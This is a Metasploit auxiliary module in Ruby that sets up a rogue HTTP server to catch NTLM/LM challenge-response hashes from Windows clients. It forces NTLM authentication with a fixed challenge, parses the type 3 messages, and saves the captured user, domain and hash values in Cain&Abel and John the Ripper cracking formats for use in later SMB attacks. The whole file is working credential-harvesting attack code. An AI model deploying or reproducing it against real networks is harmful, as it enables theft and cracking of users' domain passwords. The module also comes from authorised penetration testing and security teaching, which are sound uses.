##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

require 'rex/proto/ntlm/constants'
require 'rex/proto/ntlm/message'
require 'rex/proto/ntlm/crypt'

NTLM_CONST = Rex::Proto::NTLM::Constants
NTLM_CRYPT = Rex::Proto::NTLM::Crypt
MESSAGE = Rex::Proto::NTLM::Message

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Auxiliary::Report

	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'HTTP Client MS Credential Catcher',
			'Version'     => '$Revision$',
			'Description' => %q{
					This module attempts to quietly catch NTLM/LM Challenge hashes.
				},
			'Author'      =>
				[
					'Ryan Linn <sussurro[at]happypacket.net>',
				],
			'Version'     => '$Revision$',
			'License'     => MSF_LICENSE,
			'Actions'     =>
				[
					[ 'WebServer' ]
				],
			'PassiveActions' =>
				[
					'WebServer'
				],
			'DefaultAction'  => 'WebServer'))

		register_options([
			#OptString.new('LOGFILE',     [ false, "The local filename to store the captured hashes", nil ]),
			OptString.new('CAINPWFILE',  [ false, "The local filename to store the hashes in Cain&Abel format", nil ]),
			OptString.new('JOHNPWFILE',  [ false, "The prefix to the local filename to store the hashes in JOHN format", nil ]),
			OptString.new('CHALLENGE',   [ true, "The 8 byte challenge ", "1122334455667788" ])

		], self.class)

		register_advanced_options([
			OptString.new('DOMAIN',  [ false, "The default domain to use for NTLM authentication", "DOMAIN"]),
			OptString.new('SERVER',  [ false, "The default server to use for NTLM authentication", "SERVER"]),
			OptString.new('DNSNAME',  [ false, "The default DNS server name to use for NTLM authentication", "SERVER"]),
			OptString.new('DNSDOMAIN',  [ false, "The default DNS domain name to use for NTLM authentication", "example.com"]),
			OptBool.new('FORCEDEFAULT',  [ false, "Force the default settings", false])
		], self.class)

	end

	def on_request_uri(cli, request)
		print_status("Request '#{request.uri}' from #{cli.peerhost}:#{cli.peerport}")

		# If the host has not started auth, send 401 authenticate with only the NTLM option
		if(!request.headers['Authorization'])
			response = create_response(401, "Unauthorized")
			response.headers['WWW-Authenticate'] = "NTLM"
			cli.send_response(response)
		else
			method,hash = request.headers['Authorization'].split(/\s+/,2)
			# If the method isn't NTLM something odd is goign on. Regardless, this won't get what we want, 404 them
			if(method != "NTLM")
				print_status("Unrecognized Authorization header, responding with 404")
				send_not_found(cli)
				return false
			end

			response = handle_auth(cli,hash)
			cli.send_response(response)
		end
	end

	def run
		if datastore['CHALLENGE'].to_s =~ /^([a-fA-F0-9]{16})$/
			@challenge = [ datastore['CHALLENGE'] ].pack("H*")
		else
			print_error("CHALLENGE syntax must match 1122334455667788")
			return
		end
		exploit()
	end

	def handle_auth(cli,hash)
		#authorization string is base64 encoded message
		message = Rex::Text.decode_base64(hash)

		if(message[8,1] == "\x01")
			domain = datastore['DOMAIN']
			server = datastore['SERVER']
			dnsname = datastore['DNSNAME']
			dnsdomain = datastore['DNSDOMAIN']

			if(!datastore['FORCEDEFAULT'])
				dom,ws = parse_type1_domain(message)
				if(dom)
					domain = dom
				end
				if(ws)
					server = ws
				end
			end

			response = create_response(401, "Unauthorized")
			chalhash = MESSAGE.process_type1_message(hash,@challenge,domain,server,dnsname,dnsdomain)
			response.headers['WWW-Authenticate'] = "NTLM " + chalhash
			return response

		#if the message is a type 3 message, then we have our creds
		elsif(message[8,1] == "\x03")
			domain,user,host,lm_hash,ntlm_hash = MESSAGE.process_type3_message(hash)
			nt_len = ntlm_hash.length

			if nt_len == 48 #lmv1/ntlmv1 or ntlm2_session
				arg = {	:ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE,
					:lm_hash => lm_hash,
					:nt_hash => ntlm_hash
				}

				if arg[:lm_hash][16,32] == '0' * 32
					arg[:ntlm_ver] = NTLM_CONST::NTLM_2_SESSION_RESPONSE
				end
			#if the length of the ntlm response is not 24 then it will be bigger and represent
			# a ntlmv2 response
			elsif nt_len > 48 #lmv2/ntlmv2
				arg = {	:ntlm_ver 		=> NTLM_CONST::NTLM_V2_RESPONSE,
					:lm_hash 		=> lm_hash[0, 32],
					:lm_cli_challenge 	=> lm_hash[32, 16],
					:nt_hash 		=> ntlm_hash[0, 32],
					:nt_cli_challenge 	=> ntlm_hash[32, nt_len  - 32]
				}
			elsif nt_len == 0
				print_status("Empty hash from #{host} captured, ignoring ... ")
			else
				print_status("Unknown hash type from #{host}, ignoring ...")
			end

			# If we get an empty hash, or unknown hash type, arg is not set.
			# So why try to read from it?
			if not arg.nil?
				arg[:host] = host
				arg[:user] = user
				arg[:domain] = domain
				arg[:ip] = cli.peerhost
				html_get_hash(arg)
			end

			response = create_response(200)
			response.headers['Cache-Control'] = "no-cache"
			return response
		else
			response = create_response(200)
			response.headers['Cache-Control'] = "no-cache"
			return response
		end

	end

	def parse_type1_domain(message)
		domain = nil
		workstation = nil

		reqflags = message[12,4]
		reqflags = reqflags.unpack("V").first

		if((reqflags & NTLM_CONST::NEGOTIATE_DOMAIN) == NTLM_CONST::NEGOTIATE_DOMAIN)
			dom_len = message[16,2].unpack('v')[0].to_i
			dom_off = message[20,2].unpack('v')[0].to_i
			domain = message[dom_off,dom_len].to_s
		end
		if((reqflags & NTLM_CONST::NEGOTIATE_WORKSTATION) == NTLM_CONST::NEGOTIATE_WORKSTATION)
			wor_len = message[24,2].unpack('v')[0].to_i
			wor_off = message[28,2].unpack('v')[0].to_i
			workstation = message[wor_off,wor_len].to_s
		end
		return domain,workstation

	end

	def html_get_hash(arg = {})
		ntlm_ver = arg[:ntlm_ver]
		if ntlm_ver == NTLM_CONST::NTLM_V1_RESPONSE or ntlm_ver == NTLM_CONST::NTLM_2_SESSION_RESPONSE
			lm_hash = arg[:lm_hash]
			nt_hash = arg[:nt_hash]
		else
			lm_hash = arg[:lm_hash]
			nt_hash = arg[:nt_hash]
			lm_cli_challenge = arg[:lm_cli_challenge]
			nt_cli_challenge = arg[:nt_cli_challenge]
		end
		domain = arg[:domain]
		user = arg[:user]
		host = arg[:host]
		ip = arg[:ip]
		
		unless @previous_lm_hash == lm_hash and @previous_ntlm_hash == nt_hash then

			@previous_lm_hash = lm_hash
			@previous_ntlm_hash = nt_hash

			# Check if we have default values (empty pwd, null hashes, ...) and adjust the on-screen messages correctly
			case ntlm_ver
			when NTLM_CONST::NTLM_V1_RESPONSE
				if NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [nt_hash].pack("H*"),:srv_challenge => @challenge,
								:ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE, :type => 'ntlm' })
					print_status("NLMv1 Hash correspond to an empty password, ignoring ... ")
					return
				end
				if (lm_hash == nt_hash or lm_hash == "" or lm_hash =~ /^0*$/ ) then
					lm_hash_message = "Disabled"
				elsif NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [lm_hash].pack("H*"),:srv_challenge => @challenge,
								:ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE, :type => 'lm' })
					lm_hash_message = "Disabled (from empty password)"
				else
					lm_hash_message = lm_hash
					lm_chall_message = lm_cli_challenge
				end
			when NTLM_CONST::NTLM_V2_RESPONSE
				if NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [nt_hash].pack("H*"),:srv_challenge => @challenge,
								:cli_challenge => [nt_cli_challenge].pack("H*"),
								:user => Rex::Text::to_ascii(user),
								:domain => Rex::Text::to_ascii(domain),
								:ntlm_ver => NTLM_CONST::NTLM_V2_RESPONSE, :type => 'ntlm' })
					print_status("NTLMv2 Hash correspond to an empty password, ignoring ... ")
					return
				end
				if lm_hash == '0' * 32 and lm_cli_challenge == '0' * 16
					lm_hash_message = "Disabled"
					lm_chall_message = 'Disabled'
				elsif NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [lm_hash].pack("H*"),:srv_challenge => @challenge,
								:cli_challenge => [lm_cli_challenge].pack("H*"),
								:user => Rex::Text::to_ascii(user),
								:domain => Rex::Text::to_ascii(domain),
								:ntlm_ver => NTLM_CONST::NTLM_V2_RESPONSE, :type => 'lm' })
					lm_hash_message = "Disabled (from empty password)"
					lm_chall_message = 'Disabled'
				else
					lm_hash_message = lm_hash
					lm_chall_message = lm_cli_challenge
				end

			when NTLM_CONST::NTLM_2_SESSION_RESPONSE
				if NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [nt_hash].pack("H*"),:srv_challenge => @challenge,
								:cli_challenge => [lm_hash].pack("H*")[0,8],
								:ntlm_ver => NTLM_CONST::NTLM_2_SESSION_RESPONSE, :type => 'ntlm' })
					print_status("NTLM2_session Hash correspond to an empty password, ignoring ... ")
					return
				end
				lm_hash_message = lm_hash
				lm_chall_message = lm_cli_challenge
			end

			# Display messages
			domain = Rex::Text::to_ascii(domain)
			user = Rex::Text::to_ascii(user)	

			capturedtime = Time.now.to_s
			case ntlm_ver
			when NTLM_CONST::NTLM_V1_RESPONSE
				smb_db_type_hash = "smb_netv1_hash"
				capturelogmessage =
					"#{capturedtime}\nNTLMv1 Response Captured from #{host} \n" +
					"DOMAIN: #{domain} USER: #{user} \n" +
					"LMHASH:#{lm_hash_message ? lm_hash_message : "<NULL>"} \nNTHASH:#{nt_hash ? nt_hash : "<NULL>"}\n"
			when NTLM_CONST::NTLM_V2_RESPONSE
				smb_db_type_hash = "smb_netv2_hash"
				capturelogmessage =
					"#{capturedtime}\nNTLMv2 Response Captured from #{host} \n" +
					"DOMAIN: #{domain} USER: #{user} \n" +
					"LMHASH:#{lm_hash_message ? lm_hash_message : "<NULL>"} " +
					"LM_CLIENT_CHALLENGE:#{lm_chall_message ? lm_chall_message : "<NULL>"}\n" +
					"NTHASH:#{nt_hash ? nt_hash : "<NULL>"} " +
					"NT_CLIENT_CHALLENGE:#{nt_cli_challenge ? nt_cli_challenge : "<NULL>"}\n"
			when NTLM_CONST::NTLM_2_SESSION_RESPONSE
				#we can consider those as netv1 has they have the same size and i cracked the same way by cain/jtr
				#also 'real' netv1 is almost never seen nowadays except with smbmount or msf server capture
				smb_db_type_hash = "smb_netv1_hash"
				capturelogmessage =
					"#{capturedtime}\nNTLM2_SESSION Response Captured from #{host} \n" +
					"DOMAIN: #{domain} USER: #{user} \n" +
					"NTHASH:#{nt_hash ? nt_hash : "<NULL>"}\n" +
					"NT_CLIENT_CHALLENGE:#{lm_hash_message ? lm_hash_message[0,16] : "<NULL>"} \n"

			else # should not happen
				return
			end

			print_status(capturelogmessage)

			# DB reporting
			# Rem :  one report it as a smb_challenge on port 445 has breaking those hashes
			# will be mainly use for psexec / smb related exploit
			report_auth_info(
				:host  => ip,
				:port => 445,
				:sname => 'smb_challenge',
				:user => user,
				:pass => domain + ":" +
					( lm_hash + lm_cli_challenge.to_s ? lm_hash + lm_cli_challenge.to_s : "00" * 24 ) + ":" +
					( nt_hash + nt_cli_challenge.to_s ? nt_hash + nt_cli_challenge.to_s :  "00" * 24 ) + ":" +
					datastore['CHALLENGE'].to_s,
				:type => smb_db_type_hash,
				:proof => "DOMAIN=#{domain}",
				:source_type => "captured",
				:active => true
			)
			#if(datastore['LOGFILE'])
			#	File.open(datastore['LOGFILE'], "ab") {|fd| fd.puts(capturelogmessage + "\n")}
			#end

			if(datastore['CAINPWFILE'] and user)
				if ntlm_ver == NTLM_CONST::NTLM_V1_RESPONSE or ntlm_ver == NTLM_CONST::NTLM_2_SESSION_RESPONSE
					fd = File.open(datastore['CAINPWFILE'], "ab")
					fd.puts(
						[
							user,
							domain ? domain : "NULL",
							@challenge.unpack("H*")[0],
							lm_hash ? lm_hash : "0" * 48,
							nt_hash ? nt_hash : "0" * 48
						].join(":").gsub(/\n/, "\\n")
					)
					fd.close
				end
			end

			if(datastore['JOHNPWFILE'] and user)
				case ntlm_ver
				when NTLM_CONST::NTLM_V1_RESPONSE, NTLM_CONST::NTLM_2_SESSION_RESPONSE

					fd = File.open(datastore['JOHNPWFILE'] + '_netntlm', "ab")
					fd.puts(
						[
							user,"",
							domain ? domain : "NULL",
							lm_hash ? lm_hash : "0" * 48,
							nt_hash ? nt_hash : "0" * 48,
							@challenge.unpack("H*")[0]
						].join(":").gsub(/\n/, "\\n")
					)
					fd.close
				when NTLM_CONST::NTLM_V2_RESPONSE
					#lmv2
					fd = File.open(datastore['JOHNPWFILE'] + '_netlmv2', "ab")
					fd.puts(
						[
							user,"",
							domain ? domain : "NULL",
							@challenge.unpack("H*")[0],
							lm_hash ? lm_hash : "0" * 32,
							lm_cli_challenge ? lm_cli_challenge : "0" * 16
						].join(":").gsub(/\n/, "\\n")
					)
					fd.close
					#ntlmv2
					fd = File.open(datastore['JOHNPWFILE'] + '_netntlmv2' , "ab")
					fd.puts(
						[
							user,"",
							domain ? domain : "NULL",
							@challenge.unpack("H*")[0],
							nt_hash ? nt_hash : "0" * 32,
							nt_cli_challenge ? nt_cli_challenge : "0" * 160
						].join(":").gsub(/\n/, "\\n")
					)
					fd.close
				end

			end
		end
	end

end
